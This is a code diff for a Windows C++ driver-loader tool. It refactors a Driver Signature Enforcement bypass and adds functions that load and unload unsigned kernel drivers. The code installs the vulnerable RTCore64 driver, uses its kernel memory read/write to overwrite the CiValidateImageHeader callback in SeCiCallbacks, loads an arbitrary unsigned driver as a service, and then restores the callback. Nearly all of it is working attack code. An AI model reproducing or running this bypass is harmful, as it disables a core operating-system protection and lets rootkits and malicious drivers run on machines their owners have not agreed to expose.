@@ -208,7 +208,9 @@ bool DrvLoader::InstallAndStartDriver() {
     if (!CheckDriverFileExists()) {
         return false;
     }
+    
     StopAndRemoveDriver();
+    
     SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
     if (!hSCM) {
         std::wcout << L"[-] Failed to open Service Control Manager (error: " << GetLastError() << L")\n";
@@ -268,7 +270,7 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     uint64_t zwFlushInstructionCacheOffset = 0;
     bool usedCache = false;
     
-    // Try to use cached mini-PDB first (no symbol download needed!)
+    // Try to use cached mini-PDB first
     if (TryLoadOffsetsFromCache(&seCiCallbacksOffset, &zwFlushInstructionCacheOffset)) {
         std::wcout << L"[+] Using cached offsets from mini-PDB - no symbol download needed!\n";
         usedCache = true;
@@ -296,11 +298,11 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
         seCiCallbacksOffset = *seCiCallbacksOpt;
         zwFlushInstructionCacheOffset = *zwFlushInstructionCacheOpt;
         
-        // Create mini-PDB for future use (only on first run)
+        // Create mini-PDB for future use
         ConfigManager::CreateWindowsMiniPdb(seCiCallbacksOffset, zwFlushInstructionCacheOffset);
     }
     
-    // NOW install driver for memory operations (required for status check)
+    // Install driver for memory operations
     if (!InstallAndStartDriver()) {
         return false;
     }
@@ -391,6 +393,92 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     return true;
 }
 
+bool DrvLoader::BypassDSEInternal() {
+    std::wcout << L"[*] Obtaining kernel symbol offsets...\n";
+    
+    uint64_t seCiCallbacksOffsetVal = 0;
+    uint64_t zwFlushInstructionCacheOffsetVal = 0;
+    
+    // Try mini-PDB cache first
+    if (TryLoadOffsetsFromCache(&seCiCallbacksOffsetVal, &zwFlushInstructionCacheOffsetVal)) {
+        std::wcout << L"[+] Using cached offsets from mini-PDB\n";
+    } else {
+        std::wcout << L"[*] Cache miss - downloading symbols from Microsoft Symbol Server\n";
+        
+        auto seCiCallbacksOffset = GetKernelSymbolOffset(L"SeCiCallbacks");
+        auto zwFlushInstructionCacheOffset = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
+        
+        if (!seCiCallbacksOffset || !zwFlushInstructionCacheOffset) {
+            std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
+            return false;
+        }
+        
+        seCiCallbacksOffsetVal = *seCiCallbacksOffset;
+        zwFlushInstructionCacheOffsetVal = *zwFlushInstructionCacheOffset;
+        
+        // Cache for future use
+        ConfigManager::CreateWindowsMiniPdb(seCiCallbacksOffsetVal, zwFlushInstructionCacheOffsetVal);
+    }
+    
+    std::wcout << L"[*] Locating ntoskrnl.exe in kernel memory...\n";
+    auto ntBase = GetNtoskrnlBase();
+    if (!ntBase) {
+        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
+        return false;
+    }
+    
+    std::wcout << L"[*] Calculating target addresses using dynamic PDB symbols...\n";
+    uint64_t seCiCallbacks = *ntBase + seCiCallbacksOffsetVal;
+    uint64_t safeFunction = *ntBase + zwFlushInstructionCacheOffsetVal;
+    
+    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
+    std::wcout << L"[+] Safe function (ZwFlushInstructionCache) at: 0x" << std::hex << safeFunction << std::dec << L"\n";
+    
+    std::wcout << L"[*] Patching CiValidateImageHeader callback...\n";
+    
+    uint64_t callbackToPatch = seCiCallbacks + 0x20;
+    
+    auto currentCallback = ReadMemory64(callbackToPatch);
+    if (!currentCallback) {
+        std::wcout << L"[-] Failed to read current callback address\n";
+        return false;
+    }
+    
+    if (*currentCallback == safeFunction) {
+        std::wcout << L"[!] Callback already patched - no changes needed\n";
+        return true;
+    }
+    
+    originalCallback = *currentCallback;
+    std::wcout << L"[*] Original CiValidateImageHeader: 0x" << std::hex << *currentCallback << std::dec << L"\n";
+    
+    if (!ConfigManager::SaveOriginalCallbackToRegistry(*originalCallback)) {
+        std::wcout << L"[-] CRITICAL: Failed to save original callback to registry!\n";
+        std::wcout << L"[-] Cannot proceed - restoration would be impossible\n";
+        return false;
+    }
+    
+    std::wcout << L"[+] Original callback backed up successfully\n";
+    std::wcout << L"[*] Replacing with safe function: 0x" << std::hex << safeFunction << std::dec << L"\n";
+    
+    if (!WriteMemory64(callbackToPatch, safeFunction)) {
+        std::wcout << L"[-] Failed to write new callback address\n";
+        return false;
+    }
+    
+    auto newCallback = ReadMemory64(callbackToPatch);
+    if (!newCallback || *newCallback != safeFunction) {
+        std::wcout << L"[-] Patch verification failed - memory write unsuccessful\n";
+        return false;
+    }
+    
+    std::wcout << L"[+] DSE bypass completed successfully!\n";
+    std::wcout << L"[+] CiValidateImageHeader has been replaced with ZwFlushInstructionCache\n";
+    std::wcout << L"[+] Unsigned drivers can now be loaded\n";
+    
+    return true;
+}
+
 bool DrvLoader::BypassDSE() {
     std::wcout << L"\n[=== DSE Bypass - Single Callback Patch ===]\n\n";
     
@@ -407,90 +495,106 @@ bool DrvLoader::BypassDSE() {
     }
     std::wcout << L"[+] RTCore64 driver opened successfully\n";
     
-    std::wcout << L"[2/6] Downloading kernel symbols from Microsoft Symbol Server...\n";
-    auto seCiCallbacksOffset = GetKernelSymbolOffset(L"SeCiCallbacks");
-    auto zwFlushInstructionCacheOffset = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
+    std::wcout << L"[2/6] Obtaining kernel symbol offsets...\n";
     
-    if (!seCiCallbacksOffset || !zwFlushInstructionCacheOffset) {
-        std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    std::wcout << L"[3/6] Locating ntoskrnl.exe in kernel memory...\n";
-    auto ntBase = GetNtoskrnlBase();
-    if (!ntBase) {
-        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    std::wcout << L"[4/6] Calculating target addresses using dynamic PDB symbols...\n";
-    uint64_t seCiCallbacks = *ntBase + *seCiCallbacksOffset;
-    uint64_t safeFunction = *ntBase + *zwFlushInstructionCacheOffset;
-    
-    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
-    std::wcout << L"[+] Safe function (ZwFlushInstructionCache) at: 0x" << std::hex << safeFunction << std::dec << L"\n";
-    
-    std::wcout << L"[5/6] Patching CiValidateImageHeader callback...\n";
-    
-    uint64_t callbackToPatch = seCiCallbacks + 0x20;
-    
-    auto currentCallback = ReadMemory64(callbackToPatch);
-    if (!currentCallback) {
-        std::wcout << L"[-] Failed to read current callback address\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    if (*currentCallback == safeFunction) {
-        std::wcout << L"[!] Callback already patched - no changes needed\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return true;
-    }
-    
-    originalCallback = *currentCallback;
-    std::wcout << L"[*] Original CiValidateImageHeader: 0x" << std::hex << *currentCallback << std::dec << L"\n";
-    
-    if (!ConfigManager::SaveOriginalCallbackToRegistry(*originalCallback)) {
-        std::wcout << L"[-] CRITICAL: Failed to save original callback to registry!\n";
-        std::wcout << L"[-] Cannot proceed - restoration would be impossible\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    std::wcout << L"[+] Original callback backed up successfully\n";
-    std::wcout << L"[*] Replacing with safe function: 0x" << std::hex << safeFunction << std::dec << L"\n";
-    
-    if (!WriteMemory64(callbackToPatch, safeFunction)) {
-        std::wcout << L"[-] Failed to write new callback address\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    auto newCallback = ReadMemory64(callbackToPatch);
-    if (!newCallback || *newCallback != safeFunction) {
-        std::wcout << L"[-] Patch verification failed - memory write unsuccessful\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    std::wcout << L"[+] DSE bypass completed successfully!\n";
-    std::wcout << L"[+] CiValidateImageHeader has been replaced with ZwFlushInstructionCache\n";
-    std::wcout << L"[+] Unsigned drivers can now be loaded\n";
+    bool result = BypassDSEInternal();
     
     std::wcout << L"[6/6] Cleaning up - stopping and removing driver...\n";
     Cleanup();
     StopAndRemoveDriver();
     
     std::wcout << L"[+] System cleanup completed - no driver instances running\n";
+    
+    return result;
+}
+
+bool DrvLoader::RestoreDSEInternal() {
+    if (!originalCallback) {
+        std::wcout << L"[-] No original callback found in registry\n";
+        std::wcout << L"[!] Cannot restore - original address unknown\n";
+        return false;
+    }
+    
+    std::wcout << L"[*] Obtaining kernel symbol offsets...\n";
+    
+    uint64_t seCiCallbacksOffsetVal = 0;
+    uint64_t zwFlushInstructionCacheOffsetVal = 0;
+    
+    // Try mini-PDB cache first
+    if (TryLoadOffsetsFromCache(&seCiCallbacksOffsetVal, &zwFlushInstructionCacheOffsetVal)) {
+        std::wcout << L"[+] Using cached offsets from mini-PDB\n";
+    } else {
+        std::wcout << L"[*] Cache miss - downloading symbols from Microsoft Symbol Server\n";
+        
+        auto seCiCallbacksOffset = GetKernelSymbolOffset(L"SeCiCallbacks");
+        auto zwFlushInstructionCacheOffset = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
+        
+        if (!seCiCallbacksOffset || !zwFlushInstructionCacheOffset) {
+            std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
+            return false;
+        }
+        
+        seCiCallbacksOffsetVal = *seCiCallbacksOffset;
+        zwFlushInstructionCacheOffsetVal = *zwFlushInstructionCacheOffset;
+        
+        // Cache for future use
+        ConfigManager::CreateWindowsMiniPdb(seCiCallbacksOffsetVal, zwFlushInstructionCacheOffsetVal);
+    }
+    
+    std::wcout << L"[*] Locating ntoskrnl.exe in kernel memory...\n";
+    auto ntBase = GetNtoskrnlBase();
+    if (!ntBase) {
+        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
+        return false;
+    }
+    
+    std::wcout << L"[*] Calculating target addresses...\n";
+    uint64_t seCiCallbacks = *ntBase + seCiCallbacksOffsetVal;
+    uint64_t safeFunction = *ntBase + zwFlushInstructionCacheOffsetVal;
+    uint64_t callbackAddress = seCiCallbacks + 0x20;
+    
+    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
+    std::wcout << L"[+] Original callback to restore: 0x" << std::hex << *originalCallback << std::dec << L"\n";
+    
+    std::wcout << L"[*] Restoring original CiValidateImageHeader callback...\n";
+    
+    auto currentCallback = ReadMemory64(callbackAddress);
+    if (!currentCallback) {
+        std::wcout << L"[-] Failed to read current callback address\n";
+        return false;
+    }
+    
+    if (*currentCallback == *originalCallback) {
+        std::wcout << L"[!] Callback already restored - no changes needed\n";
+        ConfigManager::ClearPatchStateFromRegistry();
+        return true;
+    }
+    
+    if (*currentCallback != safeFunction) {
+        std::wcout << L"[!] Warning: Current callback doesn't match expected patched state\n";
+        std::wcout << L"[*] Current: 0x" << std::hex << *currentCallback << std::dec << L"\n";
+        std::wcout << L"[*] Expected: 0x" << std::hex << safeFunction << std::dec << L"\n";
+    }
+    
+    std::wcout << L"[*] Current callback: 0x" << std::hex << *currentCallback << std::dec << L"\n";
+    std::wcout << L"[*] Restoring to: 0x" << std::hex << *originalCallback << std::dec << L"\n";
+    
+    if (!WriteMemory64(callbackAddress, *originalCallback)) {
+        std::wcout << L"[-] Failed to write original callback address\n";
+        return false;
+    }
+    
+    auto restoredCallback = ReadMemory64(callbackAddress);
+    if (!restoredCallback || *restoredCallback != *originalCallback) {
+        std::wcout << L"[-] Restoration verification failed - memory write unsuccessful\n";
+        return false;
+    }
+    
+    std::wcout << L"[+] DSE restore completed successfully!\n";
+    std::wcout << L"[+] CiValidateImageHeader has been restored to original address\n";
+    std::wcout << L"[+] Driver signature enforcement is now active\n";
+    
+    ConfigManager::ClearPatchStateFromRegistry();
     
     return true;
 }
@@ -527,87 +631,261 @@ bool DrvLoader::RestoreDSE() {
     }
     std::wcout << L"[+] RTCore64 driver opened successfully\n";
     
-    std::wcout << L"[2/6] Downloading kernel symbols from Microsoft Symbol Server...\n";
-    auto seCiCallbacksOffset = GetKernelSymbolOffset(L"SeCiCallbacks");
-    auto zwFlushInstructionCacheOffset = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
+    std::wcout << L"[2/6] Obtaining kernel symbol offsets...\n";
     
-    if (!seCiCallbacksOffset || !zwFlushInstructionCacheOffset) {
-        std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    std::wcout << L"[3/6] Locating ntoskrnl.exe in kernel memory...\n";
-    auto ntBase = GetNtoskrnlBase();
-    if (!ntBase) {
-        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    std::wcout << L"[4/6] Calculating target addresses...\n";
-    uint64_t seCiCallbacks = *ntBase + *seCiCallbacksOffset;
-    uint64_t safeFunction = *ntBase + *zwFlushInstructionCacheOffset;
-    uint64_t callbackAddress = seCiCallbacks + 0x20;
-    
-    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
-    std::wcout << L"[+] Original callback to restore: 0x" << std::hex << *originalCallback << std::dec << L"\n";
-    
-    std::wcout << L"[5/6] Restoring original CiValidateImageHeader callback...\n";
-    
-    auto currentCallback = ReadMemory64(callbackAddress);
-    if (!currentCallback) {
-        std::wcout << L"[-] Failed to read current callback address\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    if (*currentCallback == *originalCallback) {
-        std::wcout << L"[!] Callback already restored - no changes needed\n";
-        ConfigManager::ClearPatchStateFromRegistry();
-        Cleanup();
-        StopAndRemoveDriver();
-        return true;
-    }
-    
-    if (*currentCallback != safeFunction) {
-        std::wcout << L"[!] Warning: Current callback doesn't match expected patched state\n";
-        std::wcout << L"[*] Current: 0x" << std::hex << *currentCallback << std::dec << L"\n";
-        std::wcout << L"[*] Expected: 0x" << std::hex << safeFunction << std::dec << L"\n";
-    }
-    
-    std::wcout << L"[*] Current callback: 0x" << std::hex << *currentCallback << std::dec << L"\n";
-    std::wcout << L"[*] Restoring to: 0x" << std::hex << *originalCallback << std::dec << L"\n";
-    
-    if (!WriteMemory64(callbackAddress, *originalCallback)) {
-        std::wcout << L"[-] Failed to write original callback address\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    auto restoredCallback = ReadMemory64(callbackAddress);
-    if (!restoredCallback || *restoredCallback != *originalCallback) {
-        std::wcout << L"[-] Restoration verification failed - memory write unsuccessful\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
-    std::wcout << L"[+] DSE restore completed successfully!\n";
-    std::wcout << L"[+] CiValidateImageHeader has been restored to original address\n";
-    std::wcout << L"[+] Driver signature enforcement is now active\n";
-    
-    ConfigManager::ClearPatchStateFromRegistry();
+    bool result = RestoreDSEInternal();
     
     std::wcout << L"[6/6] Cleaning up - stopping and removing driver...\n";
     Cleanup();
     StopAndRemoveDriver();
     
     std::wcout << L"[+] System cleanup completed - no driver instances running\n";
+    
+    return result;
+}
+
+bool DrvLoader::LoadDriver(const std::wstring& driverPath, DWORD startType, const std::wstring& dependencies) {
+    std::wcout << L"\n[=== Load Unsigned Driver ===]\n\n";
+    
+    // Normalize path
+    std::wstring normalizedPath = ConfigManager::NormalizeDriverPath(driverPath);
+    std::wstring serviceName = ConfigManager::ExtractServiceName(normalizedPath);
+    
+    std::wcout << L"[*] Driver path: " << normalizedPath << L"\n";
+    std::wcout << L"[*] Service name: " << serviceName << L"\n";
+    std::wcout << L"[*] Start type: " << startType << L"\n";
+    
+    // Verify driver file exists
+    DWORD attrib = GetFileAttributesW(normalizedPath.c_str());
+    if (attrib == INVALID_FILE_ATTRIBUTES) {
+        std::wcout << L"[-] Driver file not found: " << normalizedPath << L"\n";
+        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+        return false;
+    }
+    
+    std::wcout << L"[+] Driver file found\n";
+    
+    // STEP 1: Install RTCore64 once for entire operation
+    std::wcout << L"\n[1/4] Installing RTCore64 driver...\n";
+    if (!InstallAndStartDriver()) {
+        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+        return false;
+    }
+    
+    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+    if (hDriver == INVALID_HANDLE_VALUE) {
+        std::wcout << L"[-] Failed to open RTCore64 driver\n";
+        StopAndRemoveDriver();
+        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+        return false;
+    }
+    std::wcout << L"[+] RTCore64 driver opened successfully\n";
+    
+    // STEP 2: Patch DSE using already installed driver
+    std::wcout << L"\n[2/4] Patching DSE...\n";
+    if (!BypassDSEInternal()) {
+        std::wcout << L"[-] Failed to patch DSE\n";
+        Cleanup();
+        StopAndRemoveDriver();
+        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+        return false;
+    }
+    
+    // STEP 3: Create and start service
+    std::wcout << L"\n[3/4] Creating service...\n";
+    
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) {
+        std::wcout << L"[-] Failed to open Service Control Manager (error: " << GetLastError() << L")\n";
+        RestoreDSEInternal();
+        Cleanup();
+        StopAndRemoveDriver();
+        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+        return false;
+    }
+    
+    // Check if service already exists
+    SC_HANDLE hExistingService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_QUERY_STATUS | SERVICE_START);
+    if (hExistingService) {
+        SERVICE_STATUS_PROCESS ssp = {};
+        DWORD bytesNeeded = 0;
+        
+        if (QueryServiceStatusEx(hExistingService, SC_STATUS_PROCESS_INFO, 
+                                (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
+            if (ssp.dwCurrentState == SERVICE_RUNNING) {
+                std::wcout << L"[+] Service already exists and is running\n";
+                CloseServiceHandle(hExistingService);
+                CloseServiceHandle(hSCM);
+                
+                // Restore DSE and cleanup
+                std::wcout << L"\n[4/4] Restoring DSE...\n";
+                RestoreDSEInternal();
+                Cleanup();
+                StopAndRemoveDriver();
+                
+                std::wcout << L"\n[SUCCESS] Driver already loaded and running!\n";
+                ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, true);
+                return true;
+            }
+            else if (ssp.dwCurrentState == SERVICE_STOPPED) {
+                std::wcout << L"[+] Service exists but is stopped. Starting...\n";
+                if (StartServiceW(hExistingService, 0, nullptr)) {
+                    std::wcout << L"[+] Service started successfully\n";
+                    CloseServiceHandle(hExistingService);
+                    CloseServiceHandle(hSCM);
+                    
+                    // Restore DSE and cleanup
+                    std::wcout << L"\n[4/4] Restoring DSE...\n";
+                    RestoreDSEInternal();
+                    Cleanup();
+                    StopAndRemoveDriver();
+                    
+                    std::wcout << L"\n[SUCCESS] Driver started successfully!\n";
+                    ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, true);
+                    return true;
+                }
+                else {
+                    DWORD err = GetLastError();
+                    std::wcout << L"[-] Failed to start existing service (error: " << err << L")\n";
+                }
+            }
+        }
+        
+        CloseServiceHandle(hExistingService);
+        
+        // If we reach here, service exists but we couldn't start it
+        std::wcout << L"[-] Service exists but cannot be started\n";
+        CloseServiceHandle(hSCM);
+        RestoreDSEInternal();
+        Cleanup();
+        StopAndRemoveDriver();
+        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+        return false;
+    }
+    
+    // Create new service
+    SC_HANDLE hService = CreateServiceW(
+        hSCM,
+        serviceName.c_str(),
+        serviceName.c_str(),
+        SERVICE_ALL_ACCESS,
+        SERVICE_KERNEL_DRIVER,
+        startType,
+        SERVICE_ERROR_NORMAL,
+        normalizedPath.c_str(),
+        nullptr,
+        nullptr,
+        dependencies.empty() ? nullptr : dependencies.c_str(),
+        nullptr,
+        nullptr
+    );
+    
+    if (!hService) {
+        DWORD err = GetLastError();
+        std::wcout << L"[-] Failed to create service (error: " << err << L")\n";
+        CloseServiceHandle(hSCM);
+        RestoreDSEInternal();
+        Cleanup();
+        StopAndRemoveDriver();
+        ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+        return false;
+    }
+    
+    std::wcout << L"[+] Service created successfully\n";
+    
+    // Start service
+    if (!StartServiceW(hService, 0, nullptr)) {
+        DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
+            std::wcout << L"[+] Service already running\n";
+        } else {
+            std::wcout << L"[-] Failed to start service (error: " << err << L")\n";
+            DeleteService(hService);
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            RestoreDSEInternal();
+            Cleanup();
+            StopAndRemoveDriver();
+            ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, false);
+            return false;
+        }
+    } else {
+        std::wcout << L"[+] Service started successfully\n";
+    }
+    
+    // Close handles before restore
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+    
+    // STEP 4: Restore DSE using same driver instance
+    std::wcout << L"\n[4/4] Restoring DSE...\n";
+    if (!RestoreDSEInternal()) {
+        std::wcout << L"[-] Warning: Failed to restore DSE (driver loaded but DSE still patched)\n";
+    }
+    
+    // Cleanup RTCore64 once at the end
+    Cleanup();
+    StopAndRemoveDriver();
+    
+    std::wcout << L"\n[SUCCESS] Driver loaded successfully!\n";
+    std::wcout << L"[+] Service: " << serviceName << L"\n";
+    std::wcout << L"[+] Status: RUNNING\n";
+    
+    ConfigManager::SaveDriverLoadHistory(normalizedPath, serviceName, startType, true);
+    
+    return true;
+}
+
+bool DrvLoader::UnloadDriver(const std::wstring& serviceNameOrPath) {
+    std::wcout << L"\n[=== Unload Driver ===]\n\n";
+    
+    std::wstring serviceName = ConfigManager::ExtractServiceName(serviceNameOrPath);
+    std::wcout << L"[*] Service name: " << serviceName << L"\n";
+    
+    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) {
+        std::wcout << L"[-] Failed to open Service Control Manager (error: " << GetLastError() << L")\n";
+        return false;
+    }
+    
+    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
+    if (!hService) {
+        DWORD err = GetLastError();
+        std::wcout << L"[-] Service not found (error: " << err << L")\n";
+        CloseServiceHandle(hSCM);
+        return false;
+    }
+    
+    // Stop service
+    std::wcout << L"[1/2] Stopping service...\n";
+    SERVICE_STATUS serviceStatus;
+    if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
+        std::wcout << L"[+] Service stopped successfully\n";
+    } else {
+        DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_NOT_ACTIVE) {
+            std::wcout << L"[!] Service was not running\n";
+        } else {
+            std::wcout << L"[-] Failed to stop service (error: " << err << L")\n";
+        }
+    }
+    
+    // Delete service
+    std::wcout << L"[2/2] Deleting service...\n";
+    if (DeleteService(hService)) {
+        std::wcout << L"[+] Service deleted successfully\n";
+    } else {
+        DWORD err = GetLastError();
+        std::wcout << L"[-] Failed to delete service (error: " << err << L")\n";
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return false;
+    }
+    
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+    
+    std::wcout << L"\n[SUCCESS] Driver unloaded and service removed\n";
     
     return true;
 }
